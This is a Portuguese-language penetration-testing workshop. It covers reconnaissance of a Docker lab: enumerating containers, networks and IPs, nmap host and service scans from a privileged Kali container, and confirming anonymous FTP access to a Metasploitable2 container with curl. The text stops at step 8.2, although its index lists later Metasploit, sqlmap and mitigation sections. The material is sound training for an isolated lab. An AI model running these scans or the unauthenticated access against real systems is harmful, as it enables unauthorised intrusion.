# Workshop 02: Reconhecimento da Rede Docker e Descoberta de Serviços Vulneráveis

**Autor:** Charles Alandt

**Contato:** `echo "Y2hhcmxlcy5hbGFuZHRAZ21haWwuY29tCg==" | base64 -d`

**Uso e atribuição:** este material pode ser copiado, adaptado e utilizado livremente para fins educacionais, desde que a fonte e o autor sejam referenciados.

---

> [!CAUTION]
> **AVISO DE ÉTICA E RESPONSABILIDADE**
> Este conteúdo e ambiente foram elaborados exclusivamente para fins educacionais, laboratoriais e de pesquisa em ambiente controlado.
>
> **Uso estritamente proibido** em sistemas de terceiros, redes públicas ou redes de produção sem autorização formal. O uso deste material em qualquer contexto que viole normas legais, políticas corporativas ou limites do laboratório é de inteira responsabilidade do executor.
>
> **DISCLAIMER DE ESTABILIDADE E SUPORTE:**
> Este laboratório foi testado e validado pelo instrutor. No entanto, o ecossistema de TI (versões de kernel, distribuições Linux, imagens Docker, ferramentas de rede e provedores de virtualização) evolui rapidamente.
>
> **Fique atento:**
> - A execução é permitida apenas em laboratório isolado (VM dedicada, Docker Lab, NAT/Host-Only ou rede segregada).
> - As técnicas demonstradas envolvem reconhecimento de host, descoberta de rede, enumeração de serviços e validação controlada de vulnerabilidades, devendo permanecer restritas ao escopo autorizado do laboratório.
> - Ambientes de laboratório são sensíveis e dependentes de hardware, configuração de rede e versões de pacotes.
> - Falhas podem ocorrer devido a drivers, virtualização desativada (BIOS/VT-x/AMD-V), firewall local, ausência de pacotes, containers parados ou conflitos de rede.
> - **Ajustes manuais podem ser necessários** durante o processo para adequar o lab à sua máquina específica.

---

## Índice

- [1. Contexto e Objetivo da Aula](#1-contexto-e-objetivo-da-aula)
- [2. Escopo Operacional do Laboratório](#2-escopo-operacional-do-laboratório)
  - [Passo 2.1: Confirmar diretório, host e usuário](#passo-21-confirmar-diretório-host-e-usuário)
  - [Passo 2.2: Confirmar Docker ativo no host](#passo-22-confirmar-docker-ativo-no-host)
- [3. Fase 1: Inventário Docker do Host](#3-fase-1-inventário-docker-do-host)
  - [Passo 3.1: Listar containers ativos](#passo-31-listar-containers-ativos)
  - [Passo 3.2: Relacionar containers, imagens e portas publicadas](#passo-32-relacionar-containers-imagens-e-portas-publicadas)
  - [Passo 3.3: Listar portas em escuta no host](#passo-33-listar-portas-em-escuta-no-host)
- [4. Fase 2: Redes Docker e Endereçamento dos Containers](#4-fase-2-redes-docker-e-endereçamento-dos-containers)
  - [Passo 4.1: Listar redes Docker](#passo-41-listar-redes-docker)
  - [Passo 4.2: Identificar subrede e gateway da rede vulnerável](#passo-42-identificar-subrede-e-gateway-da-rede-vulnerável)
  - [Passo 4.3: Mapear IPs dos containers ativos](#passo-43-mapear-ips-dos-containers-ativos)
- [5. Fase 3: Acesso Controlado a Containers](#5-fase-3-acesso-controlado-a-containers)
  - [Passo 5.1: Entrar no container Kali de apoio](#passo-51-entrar-no-container-kali-de-apoio)
  - [Passo 5.2: Validar ferramentas dentro do Kali](#passo-52-validar-ferramentas-dentro-do-kali)
  - [Passo 5.3: Identificar shell disponível em um container alvo](#passo-53-identificar-shell-disponível-em-um-container-alvo)
- [6. Fase 4: Descoberta de Hosts na Rede Docker](#6-fase-4-descoberta-de-hosts-na-rede-docker)
  - [Passo 6.1: Descobrir hosts ativos com nmap](#passo-61-descobrir-hosts-ativos-com-nmap)
  - [Passo 6.2: Descobrir hosts a partir do container Kali](#passo-62-descobrir-hosts-a-partir-do-container-kali)
  - [Passo 6.3: Cruzar resultado do Docker com resultado do nmap](#passo-63-cruzar-resultado-do-docker-com-resultado-do-nmap)
- [7. Fase 5: Varredura de Serviços e Priorização de Alvos](#7-fase-5-varredura-de-serviços-e-priorização-de-alvos)
  - [Passo 7.1: Varredura focada no Metasploitable2](#passo-71-varredura-focada-no-metasploitable2)
  - [Passo 7.2: Interpretar banners e versões](#passo-72-interpretar-banners-e-versões)
  - [Passo 7.3: Salvar evidências do nmap](#passo-73-salvar-evidências-do-nmap)
- [8. Fase 6: Ataque Controlado ao FTP Vulnerável](#8-fase-6-ataque-controlado-ao-ftp-vulnerável)
  - [Passo 8.1: Confirmar FTP anônimo com nmap](#passo-81-confirmar-ftp-anônimo-com-nmap)
  - [Passo 8.2: Acessar FTP anônimo com curl](#passo-82-acessar-ftp-anônimo-com-curl)
  - [Passo 8.3: Interpretar impacto e evidência](#passo-83-interpretar-impacto-e-evidência)
  - [Passo 8.4: Ponte para exploração com Metasploit](#passo-84-ponte-para-exploração-com-metasploit)
- [9. Fase 7: Reconhecimento Web no DVWA](#9-fase-7-reconhecimento-web-no-dvwa)
  - [Passo 9.1: Identificar IP, imagem e prontidão do DVWA](#passo-91-identificar-ip-imagem-e-prontidão-do-dvwa)
  - [Passo 9.2: Varredura básica do serviço web](#passo-92-varredura-básica-do-serviço-web)
  - [Passo 9.3: Coletar headers, cookies e evidências HTTP](#passo-93-coletar-headers-cookies-e-evidências-http)
  - [Passo 9.4: Rodar scripts NSE de enumeração e vulnerabilidade](#passo-94-rodar-scripts-nse-de-enumeração-e-vulnerabilidade)
  - [Passo 9.5: Exploração controlada de SQL Injection com sqlmap](#passo-95-exploração-controlada-de-sql-injection-com-sqlmap)
- [10. Mitigação, Detecção e Hardening](#10-mitigação-detecção-e-hardening)
- [Checklist de Validação da Aula](#checklist-de-validação-da-aula)

---

## 1. Contexto e Objetivo da Aula

No workshop anterior, aprendemos a reconhecer o host `srvdocker01` a partir de uma sessão CLI, identificando usuário, grupos, processos, portas, sockets, evidências de Docker e hosts adjacentes. Nesta aula, o ponto de partida é mais avançado: já sabemos que o host executa Docker, que existem containers ativos e que parte desses serviços foi publicada na rede.

O objetivo agora é transformar observação inicial em investigação técnica estruturada. Vamos mapear containers, redes Docker, IPs internos, portas expostas, banners de serviços e prováveis vulnerabilidades.

**Resultado esperado:**

- Identificar containers ativos e suas portas publicadas.
- Diferenciar porta exposta no host de porta escutando dentro da rede Docker.
- Descobrir a subrede Docker usada pelo laboratório.
- Executar varreduras `nmap` de descoberta e serviço.
- Priorizar alvos com base em banners e versões.
- Validar, de forma controlada, um risco real em serviço FTP vulnerável.
- Registrar evidências e discutir mitigação.

---

## 2. Escopo Operacional do Laboratório

Este workshop assume que estamos conectados ao servidor `srvdocker01` e que o ambiente possui containers vulneráveis de laboratório (visto na documentação do ambiente). Os nomes e IPs podem variar conforme a instalação, por isso cada etapa inclui comandos de descoberta antes de usar valores fixos.

No ambiente validado para esta aula, foram observados:

- Host Docker: `srvdocker01`
- Rede Docker vulnerável: `docker_lab_vulneravel`
- Subrede Docker: `172.18.0.0/16`
- Gateway Docker: `172.18.0.1`
- Container de apoio: `atacante_kali`
- IP do Kali no lab: `172.18.0.21`
- Alvo principal: `lab_metasploitable2`
- IP do Metasploitable2 no lab: `172.18.0.10`

**Observação:** esses valores devem ser tratados como referência do laboratório validado. Se o seu ambiente usar outra subrede ou outros nomes de containers, ajuste os comandos com base nas saídas obtidas durante a aula. E todos os dados foram coletados durante esse workshop.

### Passo 2.1: Confirmar diretório, host e usuário

```bash
pwd
hostname
whoami
id
```

**Componentes dos comandos:**

- `pwd`: mostra o diretório atual.
- `hostname`: mostra o nome do host.
- `whoami`: mostra o usuário efetivo.
- `id`: mostra UID, GID e grupos do usuário.

**Resultado esperado:** no laboratório validado, o prompt estava no host `srvdocker01`. Dependendo da execução, podemos estar com o usuário `user1` com acesso ao grupo `docker`, ou como `root` durante a validação conduzida pelo instrutor.

**Análise:** antes de explorar rede e containers, confirme onde você está. Confundir host, container e máquina atacante é um erro comum. Em segurança, contexto de execução é parte da evidência: o mesmo comando pode ter impacto e visibilidade completamente diferentes se executado no host Docker, dentro do Kali ou dentro do alvo vulnerável.

### Passo 2.2: Confirmar Docker ativo no host

```bash
docker version
docker info
```

**Flags utilizadas:** nenhuma.

**Resultado esperado:** o comando deve retornar versão do cliente, versão do servidor Docker Engine, runtime, storage driver e informações gerais do daemon.

**Análise:** se `docker version` retorna dados do servidor, conseguimos conversar com o Docker Engine. Isso é uma informação crítica. Quem controla o Docker Engine consegue listar containers, redes, volumes e, dependendo das permissões, criar containers com acesso privilegiado. Neste workshop, esse acesso é parte intencional do laboratório.

---

## 3. Fase 1: Inventário Docker do Host

Antes de usar `nmap`, vamos explorar a fonte mais confiável disponível: o próprio Docker. Se temos permissão para consultar o daemon, conseguimos obter nomes, imagens, portas publicadas, redes e IPs dos containers com alta precisão.

### Passo 3.1: Listar containers ativos

```bash
docker ps
```

**Flags utilizadas:** nenhuma.

**Resultado esperado:** lista de containers em execução com `CONTAINER ID`, `IMAGE`, `COMMAND`, `CREATED`, `STATUS`, `PORTS` e `NAMES`.

**Análise:** observe especialmente:

- `CONTAINER ID`: identificador curto do container. É útil para comandos rápidos, mas em documentação preferimos usar o nome quando ele é claro.
- `IMAGE`: indica a tecnologia ou aplicação provável. Uma imagem como `mysql:8.0`, `phpmyadmin/phpmyadmin`, `vulnerables/web-dvwa` ou `tleemcjr/metasploitable2` já sugere função e superfície de ataque.
- `COMMAND`: mostra o processo inicial executado pelo container. Ajuda a entender se ele sobe um serviço web, banco, daemon ou script de inicialização.
- `CREATED`: mostra há quanto tempo o container foi criado. Esse campo não significa que ele está rodando desde aquele momento; ele indica o momento de criação do objeto container.
- `STATUS`: mostra o estado atual e, quando aplicável, há quanto tempo está em execução. Exemplos comuns: `Up 11 days`, `Exited`, `Restarting` ou `Up ... (healthy)`.
- `PORTS`: mostra portas internas e publicações no host. É aqui que começamos a diferenciar serviço interno de serviço exposto para fora da rede Docker.
- `NAMES`: ajuda a identificar função do container e facilita comandos como `docker inspect`, `docker exec` e `docker logs`.

**Leitura prática de `CREATED` e `STATUS`:** um container pode ter sido criado há duas semanas (`CREATED`) e estar rodando há 11 dias (`STATUS`). Isso indica que ele foi criado antes da última inicialização, reinício ou atualização. Um `STATUS` como `Up 11 days` sugere estabilidade operacional relativa: a aplicação está em execução há bastante tempo sem reiniciar. Já um `STATUS` como `Up 11 seconds`, `Restarting` ou alternando constantemente entre estados pode indicar deploy recente, falha de inicialização, crash loop, erro de configuração ou dependência indisponível. Nesse caso, a investigação deve começar imediatamente, pois instabilidade também é evidência.

**Reflexão de segurança:** containers com `STATUS` muito antigo podem indicar serviços esquecidos, laboratórios abandonados ou aplicações sem ciclo de manutenção. Já containers em `Restarting` podem indicar falha operacional, crash loop ou configuração instável. Ambos os casos merecem investigação: estabilidade também é evidência.

No laboratório validado, alguns nomes relevantes foram:

```text
atacante_kali
lab_juice_shop
lab_portainer
lab_dvwa
lab_metasploitable2
lab_vapi_www
lab_phpmyadmin
```

**Reflexão de segurança:** em um ambiente corporativo, nomes de containers frequentemente vazam arquitetura, função e criticidade. Um container chamado `db-prod`, `jenkins-admin`, `portainer`, `phpmyadmin` ou `metasploitable2` já entrega pistas antes mesmo de qualquer varredura de rede.

### Passo 3.2: Relacionar containers, imagens e portas publicadas

```bash
docker ps --format 'table {{.Names}}\t{{.Image}}\t{{.Ports}}'
```

**Flags e componentes utilizados:**

- `--format`: define um formato customizado de saída.
- `table`: imprime em formato tabular.
- `{{.Names}}`: exibe o nome do container.
- `{{.Image}}`: exibe a imagem usada.
- `{{.Ports}}`: exibe portas internas e publicações no host.
- `\t`: separa colunas por tabulação.

**Resultado esperado no laboratório validado:** saída semelhante a:

```text
NAMES                 IMAGE                            PORTS
atacante_kali         kalilinux/kali-rolling
lab_juice_shop        bkimminich/juice-shop            0.0.0.0:3000->3000/tcp
lab_portainer         portainer/portainer-ce:latest    0.0.0.0:9443->9443/tcp
lab_dvwa              vulnerables/web-dvwa             0.0.0.0:8080->80/tcp
lab_metasploitable2   tleemcjr/metasploitable2:latest  0.0.0.0:2121->21/tcp, 0.0.0.0:2222->22/tcp, 0.0.0.0:8181->80/tcp
```

**Análise:** a notação `0.0.0.0:8080->80/tcp` significa que a porta `8080` do host encaminha para a porta `80/tcp` do container. Já uma porta listada apenas como `6379/tcp`, sem `0.0.0.0:PORTA->`, normalmente está exposta apenas dentro da rede Docker, não diretamente publicada no host.

**Ponto de atenção:** se um serviço administrativo como Portainer, phpMyAdmin, banco de dados ou scanner de vulnerabilidade aparece publicado em `0.0.0.0`, ele pode estar acessível por todas as interfaces do host. A pergunta correta não é “funciona?”, é “quem consegue alcançar isso e por quê?”.

### Passo 3.3: Listar portas em escuta no host

```bash
ss -tulpn
```

**Flags utilizadas:**

- `-t`: lista sockets TCP.
- `-u`: lista sockets UDP.
- `-l`: mostra apenas portas em escuta.
- `-p`: mostra processo associado.
- `-n`: não resolve nomes; mostra portas e IPs numericamente.

**Resultado esperado no laboratório validado:** foram observadas portas publicadas por `docker-proxy`, incluindo:

```text
0.0.0.0:3000   docker-proxy
0.0.0.0:8080   docker-proxy
0.0.0.0:8181   docker-proxy
0.0.0.0:2121   docker-proxy
0.0.0.0:2222   docker-proxy
0.0.0.0:3307   docker-proxy
0.0.0.0:33306  docker-proxy
0.0.0.0:9443   docker-proxy
0.0.0.0:9392   docker-proxy
```

**Análise:** `docker-proxy` indica que o Docker está intermediando conexões entre uma porta do host e uma porta de container. Isso conecta a visão do host (`ss`) com a visão do Docker (`docker ps`). Quando um serviço escuta em `0.0.0.0`, ele aceita conexões em todas as interfaces IPv4 disponíveis; quando escuta em `127.0.0.1`, ele fica restrito ao loopback.

Para investigar uma porta específica e identificar o processo com mais foco, podemos filtrar a saída do `ss`. Exemplo para a porta `8080`:

```bash
ss -tulpn 'sport = :8080'
```

**Componentes do comando:**

- usuario necessita ser root para retornar o pid
- `sport = :8080`: filtra sockets cujo porto local de origem é `8080`.
- `-p`: exibe o processo associado, incluindo nome, PID e descritor de arquivo quando temos permissão para enxergar essa informação.

**Resultado esperado:** saída semelhante a:

```text
tcp LISTEN 0 4096 0.0.0.0:8080 0.0.0.0:* users:(("docker-proxy",pid=3086,fd=8))
```

**Análise:** nesse exemplo, o processo responsável pela escuta é `docker-proxy` e o PID é `3086`. O PID permite aprofundar a investigação com comandos como:

```bash
ps -fp 3086
```

**Componentes do comando:**

- `ps`: lista processos.
- `-f`: mostra formato completo, incluindo usuário, PID, PPID, horário e comando.
- `-p 3086`: filtra diretamente pelo PID observado.

**Alternativa com `lsof`:**

```bash
lsof -nP -iTCP:8080 -sTCP:LISTEN
```

**Flags utilizadas:**

- `-n`: não resolve nomes DNS.
- `-P`: não resolve nomes de portas; mantém número da porta.
- `-iTCP:8080`: filtra conexões TCP relacionadas à porta `8080`.
- `-sTCP:LISTEN`: mostra apenas sockets TCP em estado de escuta.

**Resultado esperado:** saída semelhante a:

```text
COMMAND      PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
docker-pr   3086 root    8u  IPv4  12345      0t0  TCP *:8080 (LISTEN)
```

**Análise:** `lsof` ajuda a responder rapidamente “qual comando, qual PID e qual usuário estão segurando esta porta?”. Em auditoria, essa correlação é importante porque uma porta aberta não é apenas um número; ela pertence a um processo, executado por um usuário, dentro de uma cadeia operacional.

**Reflexão de segurança:** publicar containers em `0.0.0.0` é conveniente, mas conveniência sem escopo vira exposição. Em laboratório isso acelera a aula. Em produção, isso exige firewall, segmentação, autenticação forte, TLS, logging e dono claro do risco.

---

## 4. Fase 2: Redes Docker e Endereçamento dos Containers

Nesta etapa, o objetivo é sair da visão “porta publicada no host” e entrar na visão da rede interna Docker. Muitos serviços não aparecem expostos no host, mas estão vivos e acessíveis para outros containers na mesma bridge.

### Passo 4.1: Listar redes Docker

```bash
docker network ls
```

**Flags utilizadas:** nenhuma.

**Resultado esperado no laboratório validado:**

```text
NETWORK ID     NAME                    DRIVER    SCOPE
0e683f17c655   bridge                  bridge    local
ddd0ff15d99f   docker_lab_vulneravel   bridge    local
eca31d9a2c26   host                    host      local
dc6d49bbc690   none                    null      local
```

**Análise:** a rede `docker_lab_vulneravel` é uma bridge local criada para o laboratório. Containers conectados à mesma bridge conseguem se comunicar diretamente por IP e, em muitos casos, por nome DNS interno do Docker.

### Passo 4.2: Identificar subrede e gateway da rede vulnerável

```bash
docker network inspect docker_lab_vulneravel --format '{{range .IPAM.Config}}{{.Subnet}} {{.Gateway}}{{end}}'
```

**Flags e componentes utilizados:**

- `network inspect`: mostra detalhes técnicos da rede Docker.
- `docker_lab_vulneravel`: nome da rede analisada.
- `--format`: filtra a saída usando template Go.
- `.IPAM.Config`: seção de configuração de endereçamento.
- `.Subnet`: subrede da rede Docker.
- `.Gateway`: gateway da bridge Docker.

**Resultado esperado no laboratório validado:**

```text
172.18.0.0/16 172.18.0.1
```

**Análise:** o resultado indica que a rede Docker usa a faixa `172.18.0.0/16` e que o gateway é `172.18.0.1`. Para varreduras didáticas, podemos começar com `172.18.0.0/24` para reduzir ruído e tempo de execução, pois os containers do laboratório validado estavam no primeiro bloco `/24`.

**Alternativa técnica:** para ver o JSON completo:

```bash
docker network inspect docker_lab_vulneravel
```

### Passo 4.3: Mapear IPs dos containers ativos

```bash
docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}} {{.Name}}' $(docker ps -q)
```

**Componentes do comando:**

- `docker ps -q`: retorna apenas IDs dos containers em execução.
- `docker inspect`: consulta metadados técnicos dos containers.
- `-f`: aplica template de saída.
- `.NetworkSettings.Networks`: percorre as redes conectadas ao container.
- `.IPAddress`: mostra o IP atribuído ao container.
- `.Name`: mostra o nome do container.

**Resultado esperado no laboratório validado:** saída semelhante a:

```text
172.18.0.21 /atacante_kali
172.18.0.30 /lab_juice_shop
172.18.0.2 /lab_portainer
172.18.0.20 /lab_dvwa
172.18.0.10 /lab_metasploitable2
172.18.0.40 /lab_vapi_www
172.18.0.42 /lab_phpmyadmin
```

**Análise:** agora temos uma tabela de alvos antes mesmo de usar `nmap`. Isso permite comparar “verdade declarada pelo Docker” com “verdade observada na rede”. Quando as duas visões divergem, normalmente há firewall, serviço parado, container sem rede, porta fechada ou política de isolamento.

---

## 5. Fase 3: Acesso Controlado a Containers

O acesso a containers será usado aqui para fins de validação e comparação. O objetivo não é “administrar por dentro” sem critério, mas entender a diferença entre o host, o container atacante e o container alvo.

### Passo 5.1: Entrar no container Kali de apoio

Nesta aula, usamos o container `atacante_kali` como estação de apoio para reconhecimento e validação. A construção conceitual do **Evil Container** foi tratada no material [Workshop Docker Socket: exploração do Docker Socket](./Workshop_docker_socket/exploit_docker_socket.md). Aqui vamos validar se ele existe e, se necessário, subir uma instância preparada para a continuidade da aula.

Antes de entrar no container, confirme se ele já existe:

```bash
docker ps -a --filter name=atacante_kali
```

**Análise:** se o container aparecer com `STATUS` como `Up`, podemos entrar nele diretamente. Se aparecer como `Exited`, basta iniciar com `docker start`. Se não houver retorno, o container ainda não foi criado neste ambiente.

Se o container existir, mas estiver parado:

```bash
docker start atacante_kali
```

Se o container ainda não existir, crie uma instância conectada à rede vulnerável e já preparada com as ferramentas da aula:

```bash
docker run -it --name atacante_kali --network docker_lab_vulneravel --privileged kalilinux/kali-rolling sh -c "apt update && apt install -y metasploit-framework iputils-ping nmap net-tools iproute2 && bash"
```

**Componentes do comando:**

- `docker run`: cria e inicia um novo container.
- `-i`: mantém STDIN aberto.
- `-t`: aloca um pseudo-terminal.
- `--name atacante_kali`: define um nome fixo para facilitar os próximos comandos.
- `--network docker_lab_vulneravel`: conecta o Kali à mesma rede Docker dos alvos.
- `--privileged`: inicia o container com permissões ampliadas no host. Neste laboratório isso é intencional para demonstrar impacto e capacidade operacional; em produção, deve ser tratado como configuração altamente sensível.
- `kalilinux/kali-rolling`: imagem base do Kali Linux.
- `sh -c "..."`: executa uma sequência de comandos dentro do container.
- `apt update`: atualiza os índices de pacotes.
- `apt install -y ...`: instala ferramentas necessárias sem solicitar confirmação interativa.
- `metasploit-framework`: framework de validação de vulnerabilidades usado na etapa posterior.
- `iputils-ping`: fornece o comando `ping`.
- `nmap`: ferramenta de descoberta e enumeração de serviços.
- `net-tools`: pacote legado com comandos como `netstat` e `ifconfig`.
- `iproute2`: pacote moderno com comandos como `ip` e `ss`.
- `bash`: abre um shell interativo ao final da preparação.

**Observação:** esse comando pode levar alguns minutos, pois instala pacotes dentro do container. Em ambiente de aula recorrente, o ideal é manter uma imagem já preparada para evitar consumo de tempo com instalação durante a prática.

```bash
docker exec -it atacante_kali bash
```

**Flags utilizadas:**

- `exec`: executa um processo em um container já existente.
- `-i`: mantém STDIN aberto.
- `-t`: aloca um pseudo-terminal.
- `atacante_kali`: nome do container.
- `bash`: interpretador de comandos solicitado.

**Resultado esperado:** o prompt muda para dentro do container Kali.

```text
root@<id-do-container>:/#
```

**Análise:** o container `atacante_kali` representa a estação de apoio ofensivo do laboratório. Ele está na mesma rede Docker dos alvos e possui ferramentas como `nmap` e `msfconsole`.

Para sair do container:

```bash
exit
```

### Passo 5.2: Validar ferramentas dentro do Kali

```bash
docker exec atacante_kali bash -lc 'command -v nmap; command -v msfconsole; ip -br addr'
```

**Componentes do comando:**

- `docker exec atacante_kali`: executa o comando no container Kali.
- `bash -lc`: abre Bash em modo de comando, carregando contexto de shell.
- `command -v nmap`: mostra o caminho do `nmap`, se existir.
- `command -v msfconsole`: mostra o caminho do Metasploit, se existir.
- `ip -br addr`: mostra interfaces e IPs de forma resumida.

**Resultado esperado no laboratório validado:**

```text
/usr/bin/nmap
/usr/bin/msfconsole
lo               UNKNOWN        127.0.0.1/8 ::1/128
eth0@if57        UP             172.18.0.21/16
```

**Análise:** o Kali está na rede `172.18.0.0/16`, com IP `172.18.0.21`. Esse IP é importante para interpretar logs do alvo: quando o Metasploitable2 registra uma conexão, a origem esperada deve ser o IP do container atacante.

### Passo 5.3: Identificar shell disponível em um container alvo

```bash
docker exec lab_metasploitable2 sh -lc 'command -v bash; command -v sh; hostname'
```

**Componentes do comando:**

- `lab_metasploitable2`: container alvo.
- `sh -lc`: executa comandos usando shell POSIX.
- `command -v bash`: verifica se Bash existe.
- `command -v sh`: verifica shell POSIX.
- `hostname`: mostra o hostname interno do container.

**Resultado esperado no laboratório validado:**

```text
/bin/bash
/bin/sh
c246d5c9785c
```

**Análise:** containers diferentes podem ter shells diferentes. Imagens minimalistas podem não possuir `bash`; nesses casos, use `/bin/sh`. Essa validação evita perder tempo tentando abrir um interpretador inexistente.

**Alternativa técnica:**

```bash
docker exec -it lab_metasploitable2 /bin/bash
```

Se falhar:

```bash
docker exec -it lab_metasploitable2 /bin/sh
```

---

## 6. Fase 4: Descoberta de Hosts na Rede Docker

Agora que temos uma subrede e um container atacante, vamos observar a rede com `nmap`. A ideia é comparar duas fontes: Docker sabe quem deveria existir; `nmap` mostra quem responde na rede.

### Passo 6.1: Descobrir hosts ativos com nmap

```bash
nmap -sn -v 172.18.0.0/24
```

**Flags utilizadas:**

- `-sn`: faz descoberta de hosts sem varredura de portas.
- `-v`: modo verbose.
- `172.18.0.0/24`: escopo reduzido para a primeira faixa da rede Docker.

**Resultado esperado no laboratório validado:** o `nmap` identificou hosts ativos dentro da rede Docker e reportou aproximadamente 25 hosts ativos na faixa `/24`.

```text
Nmap done: 256 IP addresses (25 hosts up) scanned in 15.96 seconds
```

**Análise:** a subrede real é `/16`, mas varrer `172.18.0.0/16` pode levar mais tempo e gerar ruído desnecessário para uma aula inicial. Como os containers validados estavam em `172.18.0.0/24`, começamos com o escopo menor. Depois, podemos expandir conforme necessidade.

**Alternativa menos verbosa:**

```bash
nmap -sn 172.18.0.0/24
```

### Passo 6.2: Descobrir hosts a partir do container Kali

```bash
docker exec atacante_kali nmap -sn 172.18.0.0/24
```

**Componentes do comando:**

- `docker exec atacante_kali`: executa o `nmap` de dentro do Kali.
- `nmap -sn`: faz host discovery.
- `172.18.0.0/24`: faixa analisada.

**Análise:** executar o `nmap` do host e executar o `nmap` de dentro do container atacante não são a mesma coisa. O ponto de vista muda. O Kali vê a rede como um container dentro da bridge Docker; o host vê a bridge como infraestrutura local. Essa diferença é essencial em testes de intrusão internos.

### Passo 6.3: Cruzar resultado do Docker com resultado do nmap

```bash
docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}} {{.Name}}' $(docker ps -q)
```

Depois compare com:

```bash
docker exec atacante_kali nmap -sn 172.18.0.0/24
```

**Análise:** se um IP aparece no Docker, mas não aparece no `nmap`, investigue:

- O container está realmente ligado?
- Ele está na rede correta?
- O host discovery usado pelo `nmap` é adequado?
- Há firewall interno?
- O container responde a ARP/ICMP?

**Reflexão de segurança:** inventário não é uma lista estática. Inventário é confronto entre fontes: orquestrador, sistema operacional, rede, logs e comportamento observado.

---

## 7. Fase 5: Varredura de Serviços e Priorização de Alvos

Depois de descobrir hosts, o próximo passo é descobrir serviços. Nesta fase, vamos focar no `lab_metasploitable2`, pois ele representa um alvo propositalmente vulnerável.

### Passo 7.1: Varredura focada no Metasploitable2

Substitua `172.18.0.10` pelo IP do `lab_metasploitable2` encontrado no seu ambiente.

```bash
docker exec atacante_kali nmap -sV -sC -Pn -p 21,22,80,3306 172.18.0.10
```

**Flags utilizadas:**

- `-sV`: detecta versão dos serviços.
- `-sC`: executa scripts padrão do nmap.
- `-Pn`: trata o host como ativo, sem depender de ping.
- `-p 21,22,80,3306`: limita a varredura às portas selecionadas.

**Resultado validado no laboratório:**

```text
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.3.4
22/tcp   open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1
80/tcp   open  http    Apache httpd 2.2.8 ((Ubuntu) DAV/2)
3306/tcp open  mysql   MySQL 5.0.51a-3ubuntu5
```

O script padrão também identificou:

```text
ftp-anon: Anonymous FTP login allowed (FTP code 230)
http-title: Metasploitable2 - Linux
```

**Análise:** essa saída já traz material suficiente para priorização. FTP com `vsftpd 2.3.4`, login anônimo permitido, OpenSSH antigo, Apache antigo e MySQL legado indicam um alvo rico para laboratório.

### Passo 7.2: Interpretar banners e versões

| Evidência | Interpretação inicial | Risco didático |
|----------|------------------------|----------------|
| `vsftpd 2.3.4` | Versão historicamente associada a backdoor em imagens vulneráveis | Exploração controlada em lab |
| `Anonymous FTP login allowed` | FTP permite login sem credencial individual | Vazamento, upload indevido ou coleta de arquivos |
| `OpenSSH 4.7p1` | Serviço antigo | Checagem de política, hardening e exposição |
| `Apache 2.2.8` | Web server legado | Enumeração web e CVEs históricas |
| `MySQL 5.0.51a` | Banco legado | Risco de credenciais fracas e exposição |

**Reflexão de segurança:** versão antiga não é prova automática de exploração, mas é um ponto forte de priorização. O profissional não deve sair executando exploit aleatório; deve construir uma cadeia: evidência, hipótese, validação controlada, impacto e mitigação.

### Passo 7.3: Salvar evidências do nmap

```bash
docker exec atacante_kali nmap -sV -sC -Pn -p 21,22,80,3306 -oN /tmp/nmap-metasploitable2-servicos.txt 172.18.0.10
```

**Flags adicionais:**

- `-oN /tmp/nmap-metasploitable2-servicos.txt`: salva a saída em formato normal.

Para visualizar o arquivo:

```bash
docker exec atacante_kali cat /tmp/nmap-metasploitable2-servicos.txt
```

**Análise:** evidência salva permite comparar resultados entre execuções, repetir a aula, anexar achados a um relatório e justificar por que determinado alvo foi priorizado.

---

## 8. Fase 6: Ataque Controlado ao FTP Vulnerável

Nesta fase, vamos executar uma validação simples e controlada: acesso anônimo ao FTP do Metasploitable2. O objetivo é demonstrar impacto real a partir de uma evidência do `nmap`, sem alterar o alvo e sem depender de exploração destrutiva.

### Passo 8.1: Confirmar FTP anônimo com nmap

```bash
docker exec atacante_kali nmap -sV -sC -Pn -p 21 172.18.0.10
```

**Flags utilizadas:**

- `-sV`: identifica versão do FTP.
- `-sC`: executa scripts padrão, incluindo checagens FTP comuns.
- `-Pn`: não depende de ping.
- `-p 21`: limita a análise à porta FTP.

**Resultado esperado:**

```text
21/tcp open ftp vsftpd 2.3.4
ftp-anon: Anonymous FTP login allowed (FTP code 230)
```

**Análise:** o `nmap` não apenas identificou o serviço; ele validou uma condição de risco: login anônimo permitido. Esse é o ponto em que a aula deixa de ser “porta aberta” e passa a ser “comportamento inseguro demonstrável”.

### Passo 8.2: Acessar FTP anônimo com curl

```bash
docker exec atacante_kali curl -s -v --user anonymous:anonymous ftp://172.18.0.10/
```

**Flags e componentes utilizados:**

- `docker exec atacante_kali`: executa o comando a partir do container atacante.
- `curl`: cliente de transferência.
- `-s`: modo silencioso para reduzir barra de progresso.
- `-v`: modo verbose, útil para ver diálogo FTP.
- `--user anonymous:anonymous`: autentica com usuário e senha anônimos.
- `ftp://172.18.0.10/`: URL do serviço FTP no alvo.

**Resultado validado no laboratório:**

```text
< 220 (vsFTPd 2.3.4)
> USER anonymous
< 331 Please specify the password.
> PASS anonymous
< 230 Login successful.
> PWD
< 257 "/"
> LIST
< 150 Here comes the directory listing.
< 226 Directory send OK.
```

**Análise:** `230 Login successful` confirma que o serviço aceitou autenticação anônima. Mesmo que o diretório listado esteja vazio, o achado é válido: existe uma política de autenticação permissiva em um serviço legado.

Para salvar a listagem e o diálogo FTP como evidência, primeiro precisamos observar **onde o comando está sendo executado**.

Se estivermos no **host Docker**, usamos `docker exec` para executar o comando dentro do container atacante:

```bash
docker exec atacante_kali sh -lc 'mkdir -p /tmp/evidencias && curl -sS -v --user anonymous:anonymous ftp://172.18.0.10/ --output /tmp/evidencias/ftp-listagem-root.txt 2> /tmp/evidencias/ftp-dialogo-root.txt'
```

Se já estivermos **dentro do container `atacante_kali`**, não usamos `docker exec`; executamos o `curl` diretamente:

```bash
mkdir -p /tmp/evidencias && curl -sS -v --user anonymous:anonymous ftp://172.18.0.10/ --output /tmp/evidencias/ftp-listagem-root.txt 2> /tmp/evidencias/ftp-dialogo-root.txt
```

Verifique os arquivos coletados a partir do host Docker:

```bash
docker exec atacante_kali ls -l /tmp/evidencias
docker exec atacante_kali sed -n '1,120p' /tmp/evidencias/ftp-dialogo-root.txt
docker exec atacante_kali cat /tmp/evidencias/ftp-listagem-root.txt
```

